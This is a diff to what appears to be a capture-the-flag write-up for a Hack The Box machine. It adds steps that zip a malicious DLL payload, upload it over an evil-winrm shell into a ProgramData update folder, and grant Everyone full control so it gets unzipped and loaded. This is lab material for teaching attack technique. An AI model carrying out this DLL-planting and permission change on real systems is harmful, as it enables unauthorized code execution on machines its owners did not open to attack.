@@ -513,5 +513,23 @@ Saved as: settings_update.dll
 Ill make the payload
 
 ```python
-
+❯❯❯ zip Settings_Update.zip settings_update.dll
+  adding: settings_update.dll (deflated 80%)
 ```
+
+Ill rezip it
+
+```python
+evil-winrm-py PS C:\ProgramData\UpdateMonitor> upload Settings_Update.zip .
+Uploading /home/kali/htb/logging/Settings_Update.zip: 100%|█████████████| 1.96k/1.96k [00:00<00:00, 32.6kB/s]
+[+] File uploaded successfully as: C:\ProgramData\UpdateMonitor\Settings_Update.zip
+evil-winrm-py PS C:\ProgramData\UpdateMonitor> icacls "C:\ProgramData\UpdateMonitor\Settings_Update.zip" /gran
+t Everyone:F
+processed file: C:\ProgramData\UpdateMonitor\Settings_Update.zip
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\ProgramData\UpdateMonitor>
+```
+
+Ill upload it and grant all users full control over the file so it can be unzipped
+
+
